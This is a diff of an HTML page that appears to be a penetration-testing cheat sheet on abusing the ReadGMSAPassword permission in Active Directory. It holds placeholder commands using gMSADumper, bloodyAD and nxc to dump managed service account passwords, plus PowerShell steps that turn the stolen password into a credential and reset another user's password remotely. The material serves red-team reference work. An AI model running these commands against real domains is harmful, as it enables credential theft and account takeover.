@@ -198,13 +198,34 @@
 
 <div class="content"><hr>
 <h3 id="abuse-1-read-gmsapassword-from-linux">Abuse #1: Read GMSAPassword (From Linux)</h3>
-<h4 id="gmsadumper">gMSADumper</h4>
-<p><a href="https://github.com/micahvandeusen/gMSADumper">gMSADumper</a></p>
+<p>
+<button data-tabset="set1" data-tabcontent="tab1" class="active">gMSADumper</button>
+
+<button data-tabset="set1" data-tabcontent="tab2" >BloodyAD</button>
+
+<button data-tabset="set1" data-tabcontent="tab3" >nxc</button>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 gMSADumper.py -u &lt;USER&gt; -p &lt;PASSWORD&gt; -l &lt;TARGET&gt; -d &lt;DOMAIN&gt;
-</span></span></code></pre></div><h4 id="bloodad">bloodAD</h4>
-<p><a href="https://github.com/CravateRouge/bloodyAD">bloodyAD</a></p>
+</span></span></code></pre></div></div>
+<p><small><em>Ref: <a href="https://github.com/micahvandeusen/gMSADumper">gMSADumper</a></em></small></p></div>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 bloodyAD.py -d &lt;DOMAIN&gt; -u &lt;USER&gt; -p &lt;PASSWORD&gt; --host &lt;DC&gt; get object &lt;TARGET_OBJECT&gt; --attr msDS-ManagedPassword
-</span></span></code></pre></div><h3 id="abuse-2-save-as-cred-from-windows">Abuse #2: Save as Cred (From Windows)</h3>
+</span></span></code></pre></div></div>
+<p><small><em>Ref: <a href="https://github.com/CravateRouge/bloodyAD">bloodyAD</a></em></small></p></div>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab3"><div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc ldap -u &lt;USER&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt; &lt;TARGET&gt; --gmsa
+</span></span></code></pre></div></div>
+</div></p>
+<br>
+<hr>
+<h3 id="abuse-2-save-as-cred">Abuse #2: Save as Cred</h3>
+<p>
+<button data-tabset="set2" data-tabcontent="tab1" class="active">Windows</button>
+
+<div class="tabcontent" data-tabset="set2" data-tabcontent="tab1"><div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$gmsa</span> <span class="p">=</span> <span class="nb">Get-ADServiceAccount</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">TARGET_NAME</span><span class="p">&gt;</span> <span class="n">-Properties</span> <span class="s1">&#39;msDS-ManagedPassword&#39;</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$mp</span> <span class="p">=</span> <span class="nv">$gmsa</span><span class="p">.</span><span class="s1">&#39;msDS-ManagedPassword&#39;</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$password</span> <span class="p">=</span> <span class="p">(</span><span class="nb">ConvertFrom-ADManagedPasswordBlob</span> <span class="nv">$mp</span><span class="p">).</span><span class="py">CurrentPassword</span>
@@ -212,7 +233,9 @@
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$cred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Management</span><span class="p">.</span><span class="py">Automation</span><span class="p">.</span><span class="py">PSCredential</span> <span class="p">&lt;</span><span class="n">TARGET_NAME</span><span class="p">&gt;,</span> <span class="nv">$SecPass</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># For example, change password of another target user</span>
 </span></span><span class="line"><span class="cl"><span class="nb">Invoke-Command</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">COMPUTER_NAME</span><span class="p">&gt;</span> <span class="n">-ScriptBlock</span> <span class="p">{</span><span class="nb">Set-ADAccountPassword</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">ANOTHER_TARGET_NAME</span><span class="p">&gt;</span> <span class="n">-reset</span> <span class="n">-NewPassword</span> <span class="p">(</span><span class="nb">ConvertTo-SecureString</span> <span class="n">-AsPlainText</span> <span class="s1">&#39;&lt;PASSWORD&gt;&#39;</span> <span class="n">-force</span><span class="p">)}</span> <span class="n">-Credential</span> <span class="nv">$cred</span>
-</span></span></code></pre></div><br></div></div>
+</span></span></code></pre></div></div>
+</div></p>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
